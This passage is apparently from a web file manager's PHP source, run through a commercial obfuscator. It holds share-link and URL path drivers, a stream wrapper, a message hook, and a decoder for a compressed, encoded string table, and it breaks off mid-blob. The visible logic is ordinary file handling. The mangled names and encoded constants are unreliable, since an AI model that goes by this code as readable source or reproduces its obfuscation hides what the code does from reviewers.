(method_exists($this, $B¦î•ó¿Ôà)) { return; } $cÑ—‚´ƒöÖ = call_user_func_array(array($c•¾¢½„[1124], $B¦î•ó¿Ôà), $FäœÎÓØ„ì); $Aæ°ù±‰ñ = array($c•¾¢½„[1125], $c•¾¢½„[1126], $c•¾¢½„[1127], $c•¾¢½„[1128], $c•¾¢½„[490], $c•¾¢½„[492], $c•¾¢½„[1129], $c•¾¢½„[103], $c•¾¢½„[1130], $c•¾¢½„[1131]); if (in_array($B¦î•ó¿Ôà, $Aæ°ù±‰ñ)) { $cÑ—‚´ƒöÖ = $this->getPathOuter($cÑ—‚´ƒöÖ); } return $cÑ—‚´ƒöÖ; } public function copy($e©Ø…äùï½, $C²¦½šÖÛ÷, $Aõ±»“Õø = false) { return $this->copyMove($e©Ø…äùï½, $C²¦½šÖÛ÷, $Aõ±»“Õø, $_SERVER[”Ì÷ñ­î¸][490]); } public function move($bëìøô‰ÏÌ, $EÕİâšç¹‰, $b·Û––†ùÄ = false) { return $this->copyMove($bëìøô‰ÏÌ, $EÕİâšç¹‰, $b·Û––†ùÄ, $_SERVER[”Ì÷ñ­î¸][492]); } private function copyMove($Eƒê×², $BäÛá¶¶ì, $bí¤İâ­, $EÉŒØ¶Æ‚À) { goto CÄå´·ƒœ; có·öôÔƒî: return $cŞÕ‘Ê¼¼†; goto dÑ‰¥Ê›; CÄå´·ƒœ: $EËôĞ’ì‚ =& $_SERVER[”Ì÷ñ­î¸]; $aÒ¤ö•áë = $BäÛá¶¶ì; $DæÌò­“ = IO::driverMake($BäÛá¶¶ì); goto c‡œ¢ÎÎ“; c‡œ¢ÎÎ“: if ($DæÌò­“->pathParse[$EËôĞ’ì‚[998]]) { $BäÛá¶¶ì = $DæÌò­“->pathParse[$EËôĞ’ì‚[998]]; } else { $BäÛá¶¶ì = $aÒ¤ö•áë; } $cŞÕ‘Ê¼¼† = IO::copyMove($Eƒê×², $BäÛá¶¶ì, $bí¤İâ­, $EÉŒØ¶Æ‚À); $cŞÕ‘Ê¼¼† = $this->getPathOuter($cŞÕ‘Ê¼¼†); goto có·öôÔƒî; dÑ‰¥Ê›: } public function pathFather($B‰”°ÈÒŒ) { return get_path_father($this->pathParse[$_SERVER[”Ì÷ñ­î¸][75]]); } public function iconvSystem($cÆƒß²àèœ) { return $cÆƒß²àèœ; } protected function infoParse($cØÓ¸ˆƒõ», $AÂÉ«É´£Õ = false) { $a²°Ğ‘‡Å¸ =& $_SERVER[”Ì÷ñ­î¸]; $a´­³Å…È = $this->pathParse[$a²°Ğ‘‡Å¸[439]][$a²°Ğ‘‡Å¸[1018]] . $this->pathParse[$a²°Ğ‘‡Å¸[1011]]; if ($AÂÉ«É´£Õ) { $bÑµ›ÒÑ–ô = IO::infoWithChildren($a´­³Å…È); } else { $bÑµ›ÒÑ–ô = IO::info($a´­³Å…È); } $e˜†Úõì‡ = $this->pathParse[$a²°Ğ‘‡Å¸[439]]; return Action($a²°Ğ‘‡Å¸[1123])->_shareItemeParse($bÑµ›ÒÑ–ô, $e˜†Úõì‡); } public function listAll($Cİˆã‚Ã‹) { $bÖœİ¡ªÈê =& $_SERVER[”Ì÷ñ­î¸]; $Aãª¹†Íã’ = IO::listAll($Cİˆã‚Ã‹); $D‘Îº´‚Ğø = $this->pathParse[$bÖœİ¡ªÈê[439]]; foreach ($Aãª¹†Íã’ as &$eé«çáºìš) { check_abort(); $eé«çáºìš = array_merge(IO::info($eé«çáºìš[$bÖœİ¡ªÈê[75]]), $eé«çáºìš); $eé«çáºìš[$bÖœİ¡ªÈê[391]] = Action($bÖœİ¡ªÈê[1123])->_shareItemeParse($eé«çáºìš, $D‘Îº´‚Ğø); } return $Aãª¹†Íã’; } public function getPathOuter($eÄË‡¬ÉÜÆ) { goto Aï«ªãÎ¼Ø; cÖöè¼Û„: if (substr($dêÀ÷‘ß†, 0, strlen($AäŠÓö»±)) != $AäŠÓö»±) { return !1; } return $this->pathParse[$eÆ•‹åÖˆ[1012]] . $eÆ•‹åÖˆ[8] . ltrim($f¥Ã’çä›Ó, $eÆ•‹åÖˆ[8]); goto a’’¹Œ¸ß; f“”æ…©ãÂ: $dêÀ÷‘ß† = KodIO::clear($eÄË‡¬ÉÜÆ); $AäŠÓö»± = KodIO::clear($this->pathParse[$eÆ•‹åÖˆ[439]][$eÆ•‹åÖˆ[1018]]); $f¥Ã’çä›Ó = substr($dêÀ÷‘ß†, strlen($AäŠÓö»±)); goto cÖöè¼Û„; Aï«ªãÎ¼Ø: $eÆ•‹åÖˆ =& $_SERVER[”Ì÷ñ­î¸]; $c·öÀ­ó«â = KodIO::parse($eÄË‡¬ÉÜÆ); if ($c·öÀ­ó«â[$eÆ•‹åÖˆ[29]] == KodIO::KOD_SHARE_ITEM) { return $c·öÀ­ó«â[$eÆ•‹åÖˆ[75]]; } goto f“”æ…©ãÂ; a’’¹Œ¸ß: } public function getType() { $F±ªÃ÷¯ =& $_SERVER[”Ì÷ñ­î¸]; $c…Â—Œê×Œ = str_replace($F±ªÃ÷¯[71], $F±ªÃ÷¯[33], get_class($this)); return strtolower($c…Â—Œê×Œ); } public function isTypeObject($EƒÎ›À¼¶) { return IO::isTypeObject($EƒÎ›À¼¶); } public function info($BÈéßê¬Ö™) { return $this->infoParse($BÈéßê¬Ö™); } public function infoAuth($cìå•Îùë) { return $this->infoParse($cìå•Îùë); } public function infoWithChildren($B¾µ˜‹°øÎ) { return $this->infoParse($B¾µ˜‹°øÎ, !0); } public function infoFull($CÙ¹²ŒÆ£) { return $this->infoParse($CÙ¹²ŒÆ£); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($A›Œ“ªö²ñ) { $this->pathParse = $A›Œ“ªö²ñ; } protected function infoParse($B‡äÉĞÀø, $bì¼œœ¦Ş¯ = false) { $f¬×ªæ¹ã =& $_SERVER[”Ì÷ñ­î¸]; return Action($f¬×ªæ¹ã[1017])->sharePathInfo($this->pathParse[$f¬×ªæ¹ã[75]], !0, $bì¼œœ¦Ş¯); } public function listPath($Fİ‹Ùçôğ‡, $Bá‰À¡’Î¿ = false) { $eèïºÒ²ß =& $_SERVER[”Ì÷ñ­î¸]; $eÔ‹ßˆë° = IO::listPath($Fİ‹Ùçôğ‡, $Bá‰À¡’Î¿); foreach ($eÔ‹ßˆë° as $BÏÛïÕİÍä => $d–ÌÁÇñåù) { if (!in_array($BÏÛïÕİÍä, array($eèïºÒ²ß[73], $eèïºÒ²ß[74]))) { continue; } foreach ($d–ÌÁÇñåù as $e×ù•êÈˆ => $DšìË÷‹Œ) { $DšìË÷‹Œ = Action($eèïºÒ²ß[1132])->parsePathChildren($DšìË÷‹Œ, array($eèïºÒ²ß[387] => $Fİ‹Ùçôğ‡)); $eÔ‹ßˆë°[$BÏÛïÕİÍä][$e×ù•êÈˆ] = Action($eèïºÒ²ß[1017])->shareItemInfo($DšìË÷‹Œ); } } return $eÔ‹ßˆë°; } public function listAll($A¡õòØİïÕ) { $Fµ¨õ›ß—­ =& $_SERVER[”Ì÷ñ­î¸]; $Aõù¬×„²µ = IO::listAll($A¡õòØİïÕ); foreach ($Aõù¬×„²µ as &$aå¤İŒì‹÷) { $aå¤İŒì‹÷ = array_merge(IO::info($aå¤İŒì‹÷[$Fµ¨õ›ß—­[75]]), $aå¤İŒì‹÷); $aå¤İŒì‹÷[$Fµ¨õ›ß—­[391]] = Action($Fµ¨õ›ß—­[1017])->shareItemInfo($aå¤İŒì‹÷); } return $Aõù¬×„²µ; } } goto a…¹’µ†±Â; CºªÎÛ’¯Ü: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($AÔä«Ôèã« = false) { } public function exist($C¤ˆôæ‰) { $EùŒ®‘Üêâ = $this->info($C¤ˆôæ‰); return $EùŒ®‘Üêâ[$_SERVER[”Ì÷ñ­î¸][188]]; } public function isFile($e°Ù¾µ–ËÔ) { $aÃßµÊµ„ê = $this->info($e°Ù¾µ–ËÔ); return $aÃßµÊµ„ê[$_SERVER[”Ì÷ñ­î¸][188]]; } public function isFolder($E³ƒøº—‰Œ) { return !1; } public function size($b»÷â†ÊÍ“) { $A…¶ŸÄ‘­ô = $this->info($b»÷â†ÊÍ“); return $A…¶ŸÄ‘­ô[$_SERVER[”Ì÷ñ­î¸][77]]; } public function info($Fè¶…ßØù) { return $this->infoParse($Fè¶…ßØù); } public function infoAuth($dÉĞ©ƒÈ¶) { return $this->infoParse($dÉĞ©ƒÈ¶); } public function infoWithChildren($b¼Ï¯Êß»ç) { return $this->infoParse($b¼Ï¯Êß»ç); } public function infoFull($CÎøïİîİ¾) { return $this->infoParse($CÎøïİîİ¾); } private function infoParse($aœÓÌåÛ­) { $EÊ™Şé†—µ =& $_SERVER[”Ì÷ñ­î¸]; $D±¸ŸŠ†‘œ = $this->header($aœÓÌåÛ­); if (!$D±¸ŸŠ†‘œ || !$D±¸ŸŠ†‘œ[$EÊ™Şé†—µ[690]]) { return !1; } $d¨Œœ…ÂÂë = _get($D±¸ŸŠ†‘œ, $EÊ™Şé†—µ[325], 0); $FŠŞÛ…İ®¢ = array($EÊ™Şé†—µ[28] => $D±¸ŸŠ†‘œ[$EÊ™Şé†—µ[28]], $EÊ™Şé†—µ[75] => $aœÓÌåÛ­, $EÊ™Şé†—µ[29] => $EÊ™Şé†—µ[167], $EÊ™Şé†—µ[77] => intval($d¨Œœ…ÂÂë), $EÊ™Şé†—µ[160] => get_path_ext($D±¸ŸŠ†‘œ[$EÊ™Şé†—µ[28]]), $EÊ™Şé†—µ[1164] => $d¨Œœ…ÂÂë > 0 && $D±¸ŸŠ†‘œ[$EÊ™Şé†—µ[1290]], $EÊ™Şé†—µ[1165] => !1); return $FŠŞÛ…İ®¢; } private function header($aÄ«ÁİË‡­) { if (isset(self::$_cacheHeader[$aÄ«ÁİË‡­])) { return self::$_cacheHeader[$aÄ«ÁİË‡­]; } self::$_cacheHeader[$aÄ«ÁİË‡­] = url_header($aÄ«ÁİË‡­); return self::$_cacheHeader[$aÄ«ÁİË‡­]; } public function hashSimple($AÀ¯õ„‹ƒ, $dÛæÚÃ¿Õê = false) { goto fÂ§ÊÑù¼¾; A°÷ÅÈ: $b‚»ÇªÌ = $Cåˆó¤ªŒÓ[$D”•ßÎ×±À[77]]; $BñŒà÷âªÕ = 200; $aëöÆ¡®¥ = 50; goto c¶Ù›Ö’’ß; e™Àš§†ËŠ: $bµ¢¯ßª•Û = timeFloat(); $aø¥Ú”Ï¤° = 15; for ($A’™ù¾ğåœ = 0; $A’™ù¾ğåœ < $aëöÆ¡®¥; $A’™ù¾ğåœ++) { if (timeFloat() - $bµ¢¯ßª•Û > $aø¥Ú”Ï¤°) { return !1; } $cÁ”õä§ = $this->fileSubstr($AÀ¯õ„‹ƒ, $F…µ‡Ë¿²Š * $A’™ù¾ğåœ, $BñŒà÷âªÕ); if (!$cÁ”õä§) { return !1; } $E„‰‚ì‰Ï .= $cÁ”õä§; } goto dŠëŠŠ­Œ; c¶Ù›Ö’’ß: if ($b‚»ÇªÌ <= $BñŒà÷âªÕ * $aëöÆ¡®¥) { return md5($this->fileSubstr($AÀ¯õ„‹ƒ, 0, $b‚»ÇªÌ)) . $b‚»ÇªÌ; } $F…µ‡Ë¿²Š = intval($b‚»ÇªÌ / $aëöÆ¡®¥); $E„‰‚ì‰Ï = $D”•ßÎ×±À[33]; goto e™Àš§†ËŠ; dŠëŠŠ­Œ: $E„‰‚ì‰Ï .= $this->fileSubstr($AÀ¯õ„‹ƒ, $b‚»ÇªÌ - $BñŒà÷âªÕ, $BñŒà÷âªÕ); return md5($E„‰‚ì‰Ï) . $b‚»ÇªÌ; goto bë¢×´Ò’¹; fÂ§ÊÑù¼¾: $D”•ßÎ×±À =& $_SERVER[”Ì÷ñ­î¸]; $Cåˆó¤ªŒÓ = $this->info($AÀ¯õ„‹ƒ); if (!$Cåˆó¤ªŒÓ || !$Cåˆó¤ªŒÓ[$D”•ßÎ×±À[188]]) { return !1; } goto A°÷ÅÈ; bë¢×´Ò’¹: } public function getContent($a…ÒÚ¡Š†) { return $this->fileSubstr($a…ÒÚ¡Š†); } public function fileSubstr($A´§‘¯ôŒÊ, $cßæ›Ş÷À„ = 0, $fÜö…›è¦´ = -1) { goto CîªßáÍŠß; CîªßáÍŠß: $F¹¥¾ãÂÄ‰ =& $_SERVER[”Ì÷ñ­î¸]; $c›İ´™–¹ = $this->info($A´§‘¯ôŒÊ); if (!$c›İ´™–¹ || !$c›İ´™–¹[$F¹¥¾ãÂÄ‰[188]] && $c›İ´™–¹[$F¹¥¾ãÂÄ‰[77]] > 1024 * 1024 * 10) { return !1; } goto cø—Œ¸‘÷; AæãÛ¬Ò•: $a–ƒ§¹£õ = url_request($A´§‘¯ôŒÊ, $F¹¥¾ãÂÄ‰[216], !1, $Aİøâ“ëó°, !1, !1, 1); return $a–ƒ§¹£õ[$F¹¥¾ãÂÄ‰[1034]] ? $a–ƒ§¹£õ[$F¹¥¾ãÂÄ‰[1034]] : $F¹¥¾ãÂÄ‰[33]; goto aÉå“ê¾…†; cø—Œ¸‘÷: if ($fÜö…›è¦´ === -1) { $fÜö…›è¦´ = $c›İ´™–¹[$F¹¥¾ãÂÄ‰[77]]; } if ($fÜö…›è¦´ == 0) { return $F¹¥¾ãÂÄ‰[33]; } $Aİøâ“ëó° = array($F¹¥¾ãÂÄ‰[1291] . $cßæ›Ş÷À„ . $F¹¥¾ãÂÄ‰[717] . ($cßæ›Ş÷À„ + $fÜö…›è¦´ - 1)); goto AæãÛ¬Ò•; aÉå“ê¾…†: } public function download($bÕÎÜ„º‘™, $A…†„½) { Downloader::start($bÕÎÜ„º‘™, $A…†„½); return $A…†„½; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($DùÑëº¾õñ, $F³ò«Ş¥–» = '') { goto aÇÊ²­ Øà; b÷¡…ß¶¸ø: return $this->info ? !0 : !1; goto cø‚ª«Š‡; aÇÊ²­ Øà: $this->info = $this->info($DùÑëº¾õñ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[”Ì÷ñ­î¸][75]]; goto Fˆ·Æ½»ô›; Fˆ·Æ½»ô›: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$DùÑëº¾õñ])) { self::$_chunkBuffer[$DùÑëº¾õñ] = array(); } goto b÷¡…ß¶¸ø; cø‚ª«Š‡: } function stream_read($aË®Üª‚) { $b„’ª¶Æ¬æ = $this->fileSubstr($this->pose, $aË®Üª‚); $this->pose += strlen($b„’ª¶Æ¬æ); return $b„’ª¶Æ¬æ; } public function stream_tell() { return $this->pose; } public function stream_seek($fè´‚ñ‘œ˜, $EŞ ¶îˆ‚É) { $dò¼®ÍÎƒ… =& $_SERVER[”Ì÷ñ­î¸]; if ($EŞ ¶îˆ‚É == SEEK_SET) { $this->pose = $fè´‚ñ‘œ˜; } else { if ($EŞ ¶îˆ‚É == SEEK_CUR) { $this->pose += $fè´‚ñ‘œ˜; } else { if ($EŞ ¶îˆ‚É == SEEK_END) { $this->pose = $this->info[$dò¼®ÍÎƒ…[77]] + intval($fè´‚ñ‘œ˜); } } } if ($fè´‚ñ‘œ˜ < 0) { $this->pose = $this->info[$dò¼®ÍÎƒ…[77]] + $fè´‚ñ‘œ˜; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[”Ì÷ñ­î¸][77]]; } public function stream_close() { return !0; } public function url_stat($Côç‚—Ô¬¡, $cğƒÓ›ÓÖ») { $DÈÆ–âÔËÏ =& $_SERVER[”Ì÷ñ­î¸]; $AŒ¾³Ó·Ä¾ = $this->info($Côç‚—Ô¬¡); return array($DÈÆ–âÔËÏ[1292] => 0, $DÈÆ–âÔËÏ[1293] => 0, $DÈÆ–âÔËÏ[12] => 32768 + 511, $DÈÆ–âÔËÏ[1294] => 0, $DÈÆ–âÔËÏ[1295] => 0, $DÈÆ–âÔËÏ[1296] => 0, $DÈÆ–âÔËÏ[1297] => 0, $DÈÆ–âÔËÏ[77] => $AŒ¾³Ó·Ä¾[$DÈÆ–âÔËÏ[77]], $DÈÆ–âÔËÏ[1298] => $AŒ¾³Ó·Ä¾[$DÈÆ–âÔËÏ[1170]], $DÈÆ–âÔËÏ[1256] => $AŒ¾³Ó·Ä¾[$DÈÆ–âÔËÏ[107]], $DÈÆ–âÔËÏ[1255] => $AŒ¾³Ó·Ä¾[$DÈÆ–âÔËÏ[187]], $DÈÆ–âÔËÏ[1299] => 0, $DÈÆ–âÔËÏ[1300] => 0); } static $fileInfo = array(); public function info($A½·ïêÈ™) { $dæ—Ã„ÜÒ = $_SERVER[”Ì÷ñ­î¸][1301]; if (isset(self::$fileInfo[$A½·ïêÈ™])) { return self::$fileInfo[$A½·ïêÈ™]; } if (substr($A½·ïêÈ™, 0, strlen($dæ—Ã„ÜÒ)) != $dæ—Ã„ÜÒ) { return !1; } self::$fileInfo[$A½·ïêÈ™] = IO::info(substr($A½·ïêÈ™, strlen($dæ—Ã„ÜÒ))); return self::$fileInfo[$A½·ïêÈ™]; } public static function read($DŞˆšÄá³ˆ, $A©Ã‡‰¡æ, $AµØäŞ¼İŞ) { goto f¥ª…„—±; F¯Ê©ÕÚƒˆ: $AÈ¤“ëŠ¥ì = 8192; fseek($FËéôî½Œ«, $A©Ã‡‰¡æ, SEEK_SET); $Bˆë¥’ ÕŸ = $A¿îâñğâ[33]; goto D³áœ•ÇÆÕ; D³áœ•ÇÆÕ: $c— Üéªè­ = 0; while ($c— Üéªè­ < $AµØäŞ¼İŞ) { $Eî¾ó„½‡ = min($AÈ¤“ëŠ¥ì, $AµØäŞ¼İŞ - $c— Üéªè­); $Bˆë¥’ ÕŸ .= fread($FËéôî½Œ«, $Eî¾ó„½‡); $c— Üéªè­ += $Eî¾ó„½‡; } fclose($FËéôî½Œ«); goto DÆîóÅÖ†î; DÆîóÅÖ†î: return $Bˆë¥’ ÕŸ; goto Aùİ½ªËÓ; f¥ª…„—±: $A¿îâñğâ =& $_SERVER[”Ì÷ñ­î¸]; $FËéôî½Œ« = fopen($DŞˆšÄá³ˆ, $A¿îâñğâ[1172]); if (!$FËéôî½Œ«) { return $A¿îâñğâ[33]; } goto F¯Ê©ÕÚƒˆ; Aùİ½ªËÓ: } public function fileSubstr($dõ°÷œêë, $FÒóÙ‡äŒ) { goto CéÃ—¿ŞÇ; C‚ô½’¬İº: $bÏÇÈ‰†‘¯ = ceil(($dõ°÷œêë + $FÒóÙ‡äŒ) / $E¨˜œÑ¡™‚) * $E¨˜œÑ¡™‚ - $cÑ¥Š÷†ˆß; $f¼”‹İÏ = IO::fileSubstr($this->path, $cÑ¥Š÷†ˆß, $bÏÇÈ‰†‘¯); $c£ê†Ñ’ß¹[$cÑ¥Š÷†ˆß . $DŒ²©ñ–£®[33]] = $f¼”‹İÏ; goto A¿Ãë—Ç; f“ÆÊæÏêê: $BÑÆÌ–É¾î = $FÒóÙ‡äŒ; if ($dõ°÷œêë < 0) { $dõ°÷œêë = $EôèêÂÂòá + $dõ°÷œêë; } if ($FÒóÙ‡äŒ === !1) { $FÒóÙ‡äŒ = $EôèêÂÂòá - $dõ°÷œêë; } goto fù¥ØÈîŸë; Dõà†ƒÊ: $E¨˜œÑ¡™‚ = 64 * 1024; $c£ê†Ñ’ß¹ =& self::$_chunkBuffer[$this->path]; if (!$c£ê†Ñ’ß¹) { $c£ê†Ñ’ß¹ = array(); } goto fíÏùÛ–Ø; CéÃ—¿ŞÇ: $DŒ²©ñ–£® =& $_SERVER[”Ì÷ñ­î¸]; $EôèêÂÂòá = $this->info[$DŒ²©ñ–£®[77]]; $EÖï°ÓŞ£ó = $dõ°÷œêë; goto f“ÆÊæÏêê; fù¥ØÈîŸë: if ($dõ°÷œêë + $FÒóÙ‡äŒ > $EôèêÂÂòá) { $FÒóÙ‡äŒ = $EôèêÂÂòá - $dõ°÷œêë; } if ($FÒóÙ‡äŒ <= 0) { return $DŒ²©ñ–£®[33]; } if ($dõ°÷œêë < 0 || $dõ°÷œêë >= $EôèêÂÂòá || $FÒóÙ‡äŒ <= 0 || $FÒóÙ‡äŒ > 1024 * 1024 * 5) { throw new Exception("\151\157\x46\151\154\145\x52\145\141\x64\x20\x65\x72\162\x6f\x72\x21\x20\163\x74\141\x72\x74\x3d{$dõ°÷œêë}\x3b\x6c\145\x6e\x67\164\150\x3d{$FÒóÙ‡äŒ}\x3b\x20\163\151\x7a\145\x3d{$EôèêÂÂòá}\73"); } goto Dõà†ƒÊ; A¿Ãë—Ç: ksort($c£ê†Ñ’ß¹); $cŠİìî–Éš = substr($f¼”‹İÏ, $dõ°÷œêë - $cÑ¥Š÷†ˆß, $FÒóÙ‡äŒ); return $cŠİìî–Éš; goto a—å¦Ô’¨³; fíÏùÛ–Ø: $f¼è÷¶¬¯ = 0; $cˆˆŸå²š = 0; $CĞ–åËŸ‰ù = $DŒ²©ñ–£®[33]; goto dŞÙÔäÃ Œ; dŞÙÔäÃ Œ: foreach ($c£ê†Ñ’ß¹ as $f¼è÷¶¬¯ => $CĞ–åËŸ‰ù) { $f¼è÷¶¬¯ = intval($f¼è÷¶¬¯); $cˆˆŸå²š = $f¼è÷¶¬¯ + strlen($CĞ–åËŸ‰ù); if ($dõ°÷œêë >= $cˆˆŸå²š) { continue; } if ($dõ°÷œêë >= $f¼è÷¶¬¯ && $dõ°÷œêë + $FÒóÙ‡äŒ <= $cˆˆŸå²š) { return substr($CĞ–åËŸ‰ù, $dõ°÷œêë - $f¼è÷¶¬¯, $FÒóÙ‡äŒ); } break; } if (count($c£ê†Ñ’ß¹) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($DŒ²©ñ–£®[1302], $DŒ²©ñ–£®[1303] . count($c£ê†Ñ’ß¹) . "\73\163\x74\x61\x72\164\75{$dõ°÷œêë}\54\x6c\x65\x6e\147\x74\x68\x3d{$FÒóÙ‡äŒ}\x3b\x70\157\x73\145\72{$f¼è÷¶¬¯}\x7e{$cˆˆŸå²š}"); throw new Exception($DŒ²©ñ–£®[1304]); } $cÑ¥Š÷†ˆß = intval($dõ°÷œêë / $E¨˜œÑ¡™‚) * $E¨˜œÑ¡™‚; goto C‚ô½’¬İº; a—å¦Ô’¨³: } private function log($AØğÈ¤à§§, $F¿‡ò‚‘¢) { $d—½ÑŠóö© =& $_SERVER[”Ì÷ñ­î¸]; $f×õ™Ïùìõ = timeFloat() - $this->timeStart; write_log(sprintf($d—½ÑŠóö©[1305], $AØğÈ¤à§§, $this->info[$d—½ÑŠóö©[28]], $f×õ™Ïùìõ, $F¿‡ò‚‘¢), $d—½ÑŠóö©[1221]); } } class Message { function __construct() { } public function send($Bï¡·ßƒñ = '', $dñ ×ã£“ = array(), $eæğã°êÔ« = "\x74\145\170\x74") { goto d…ÇŒ›„½Ç; A÷†ŒˆëÖ: Hook::trigger($eñ×ùŞÀñ³[1309], $cåòª·ë„); goto aíº«ÇÕ›˜; D—Â¶ø‹è¾: $dñ ×ã£“ = array($eñ×ùŞÀñ³[973] => isset($dñ ×ã£“[$eñ×ùŞÀñ³[973]]) ? $dñ ×ã£“[$eñ×ùŞÀñ³[973]] : $eñ×ùŞÀñ³[33], $eñ×ùŞÀñ³[535] => isset($dñ ×ã£“[$eñ×ùŞÀñ³[535]]) ? $dñ ×ã£“[$eñ×ùŞÀñ³[535]] : $eñ×ùŞÀñ³[33]); if (empty($Bï¡·ßƒñ) || empty($dñ ×ã£“[$eñ×ùŞÀñ³[973]]) && empty($dñ ×ã£“[$eñ×ùŞÀñ³[535]])) { return !1; } $cåòª·ë„ = array($eñ×ùŞÀñ³[1248] => $fÒŠ†¹Æñ, $eñ×ùŞÀñ³[1308] => $dñ ×ã£“); goto A÷†ŒˆëÖ; d…ÇŒ›„½Ç: $eñ×ùŞÀñ³ =& $_SERVER[”Ì÷ñ­î¸]; $fÒŠ†¹Æñ = array($eñ×ùŞÀñ³[29] => $eñ×ùŞÀñ³[1306], $eñ×ùŞÀñ³[693] => $Bï¡·ßƒñ); if (in_array($eæğã°êÔ«, array($eñ×ùŞÀñ³[1306], $eñ×ùŞÀñ³[1307]))) { $fÒŠ†¹Æñ[$eñ×ùŞÀñ³[29]] = $eæğã°êÔ«; } goto D—Â¶ø‹è¾; aíº«ÇÕ›˜: } } goto eƒâ½’÷’¼; Bº¿¬ ğ–: if (!function_exists('_kodDe')) { function _kodDe($E°‡ä¸Àäš) { $E°‡ä¸Àäš = base64_decode($E°‡ä¸Àäš); $DöñÖŸ¬¸Ğ = strlen($E°‡ä¸Àäš); $f³±—á„¾‰ = ''; $C„äÖªÌˆ© = ord($E°‡ä¸Àäš[0]) - 30; for ($CÑ˜Ó…¶ø = 1; $CÑ˜Ó…¶ø < $DöñÖŸ¬¸Ğ; $CÑ˜Ó…¶ø += 2) { if ($CÑ˜Ó…¶ø + 1 < $DöñÖŸ¬¸Ğ) { $f³±—á„¾‰ .= chr(ord($E°‡ä¸Àäš[$CÑ˜Ó…¶ø + 1]) + $C„äÖªÌˆ©); $f³±—á„¾‰ .= chr(ord($E°‡ä¸Àäš[$CÑ˜Ó…¶ø]) + $C„äÖªÌˆ©); } else { $f³±—á„¾‰ .= chr(ord($E°‡ä¸Àäš[$CÑ˜Ó…¶ø]) + $C„äÖªÌˆ©); } } return $f³±—á„¾‰; } } define("\x94\xcc\xf7\x8f\xf1\xad\xee\xb8", "\220\245\362\306"); $_SERVER[”Ì÷ñ­î¸] = explode("\x7c\x4\x7c\x1\x7c\x3", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\x9d\x7d\x9\x7c\x1b\xc5\xf5\x30\x85\x72\x24\xe5\xe8\x41\x4b\x39\xb3\x71\x12\x7c\x44\x87\x9d\x38\x97\xe3\x23\xb2\x25\xc7\x22\xb6\x25\x24\x39\x7\x96\xa3\xac\xa4\x95\xb4\xb6\xa4\x55\x76\x57"."\222\355\44\34\5\122\10\4\10\120\316\322\226\263\120\216\0\241\334\120\356\26\150\240\120\50\20\12\341\310\301\21\256\362\157\51\120\350\67\367\314\256\144\332\176\374\160\64\363\346\315\354\34\157\336\274\231"."\171\357\315\256\347\77\136\373\355\265\337\132\273\317\316\355\367\174\171\346\323\70\114\376\120\170\312\131\7\354\205\376\333\47\167\374\303\375\173\67\175\367\240\117\166\55\53\374\55\51\175\322\177\340\1\117\35"."\241\234\271\44\332\174\154\237\272\377\235\127\336\321\367\352\306\307\76\376\344\226\77\72\356\373\276\353\212\317\236\37\233\255\245\136\276\322\270\273\305\134\171\363\267\67\6\227\157\131\172\344\143\347\57\176\360"."\xad\x6f\x9d\xf7\xf7\xa6\xff\x6b\x9c\x3f\x94\xbf\xd0\xd3\xaa\xc9\x1f\x46\x9f\xfd\xe1\xc1\x4f\xde\x72\xc3\x9a\xd3\x8a\x93\xae\x1c\x3b\xa0\xef\x84\x17\x67\x8f\xdf\x38\xe7\x9f\x5f\xff\x7b\x69\x7a\xec\xda\x5f\xc7\x8b\x5b\xdc\xc7\xdd"."\xff\xc4\x5e\xaf\xf\x9e\xfb\xdd\xed\x47\x1e\xb8\xcf\xf9\xfb\x7f\xdc\xa6\x4c\xdf\xf3\xee\xc5\xdf\xf9\xd6\x54\xc7\x9e\x1f\x1d\x78\xed\x69\x7b\xdf\x91\xba\x75\xff\x53\xee\x1f\xfc\xec\x46\xef\x49\xed\x67\x1c\xd6\x74\xfe\xb5\xd7\x97".base64_decode('Vj3dM7vTcZP3X80rfq5+9L48o/l934V9f/55W/rds7c+v+/ljh88f8uqXFvSd/i1X1136eJHHWOr')."\76\175\63\276\341\137\63\16\277\155\365\337\326\357\270\255\341\206\373\56\110\35\262\340\263\356\303\357\115\377\350\201\357\357\50\246\256\376\176\62\171\340\63\247\276\361\275\77\174\351\334\357\211\227\216\173\364"."\335\233\326\255\354\276\321\171\361\126\117\373\305\317\234\171\337\147\17\175\172\256\147\360\202\33\246\334\335\354\171\172\371\311\313\77\130\161\362\131\117\35\261\264\60\355\306\117\143\317\37\265\170\170\322\345\7"."\x4f\xca\x25\x47\xae\xbd\xfd\xd7\x93\x4e\xf9\x48\x8f\xbd\xb2\xef\x2f\xaf\xf9\x9d\x16\xb9\xf1\x9a\xed\x7b\xef\xb5\x17\xee\xe7\x16\xfc\x23\xe5\x35\x53\x52\x46\x55\xc3\x34\x30\x20\xa1\xe5\x53\x6a\x1a\x87\xd5\x3c\xfe\x75\xe3\x1f\x63".base64_decode('dVY1FRyO9QcisfBAMOgLRWKkRDE9pyVJqCDrco4UXlB0A3xKLC5W0ApK3gLhgKRsynHZICV5O2Ne').base64_decode('X7A3sCIWWRH0EYx4bHVR0cdwDAXDpqybETWnMIyyzurV6Vvs75ciIU9/2NMV8Qf6Mbgr0Nfnj1TC').base64_decode('Q4He3k5P15LKlGDIs7jPI4H6ZZWYmk9pddIqnLJKqseBblXJJnEwL9PqmGMFEoqwEBiDfDGbxZF+').base64_decode('FiL1V1JyMUv6zCtGCrqak2nTlyhjDIoDctHU1HwCR3yjpi5zOKhxQldySp4UFfb1+roiEqym1B0K')."\364\111\144\50\162\262\141\52\272\264\254\307\27\362\111\260\352\155\265\250\305\265\22\316\67\320\17\72\104\362\364\366\112\23\225\140\52\271\2\55\6\347\251\122\130\40\344\365\205\244\316\25\22\357\247\204\226".strrev('ü‡äµ¿ÁbR-œ’±šÊ™,KR¡6dÔ¾;#>Ã»º‰¯pPƒ€á'."\n".'ÕT)§Œ(yiË').strrev('S ì4Éæ©-	òSº)¦